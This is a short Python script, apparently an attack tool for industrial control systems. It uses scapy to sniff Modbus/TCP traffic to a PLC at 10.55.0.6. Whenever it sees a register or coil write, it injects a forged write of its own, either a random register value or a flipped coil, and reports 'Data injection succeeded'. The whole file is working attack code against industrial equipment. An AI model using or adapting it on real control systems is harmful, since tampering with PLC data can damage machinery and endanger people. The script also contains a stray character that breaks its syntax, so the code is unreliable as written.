import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md
from time import *
from scapy.all import *
from random import *

#start = time.perf_counter()
plc = mt.TcpMaster('10.55.0.6', 502)

def changeData_reg():
        i = randrange(100, 109)
        q = randrange(1, 500)
        plc.execute(slave=1, function_code=(md.WRITE_MULTIPLE_REGISTERS), starting_address=i, quantity_of_x=1, output_value=[q])
def changeData0():
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=0)

def changeData1():
        i = randrange(40, 50)
        plc.execute(slave=1, function_code=(md.WRITE_SINGLE_COIL), starting_address=i, quantity_of_x=1, output_value=1)



xx = 1
while xx:
        plc_frames = sniff(iface="usb0", count=1, filter="dst host 10.55.0.6 and tcp[tcpflags] & tcp-push != 0")
        modbus_query = plc_frames[0]´
        st = str(modbus_query[Raw].load)
        try:
            if "\\x01\\x10\\x00" in st:
                        changeData_reg()
                        xx = 0
                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif st[-9: -1] == "\\xff\\x00":
                        changeData0()
                        xx = 0
                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif st[-9: -1] == "\\x00\\x00":
                        changeData1()
                        xx = 0
                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
        except:
            xx = 1
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
exit()
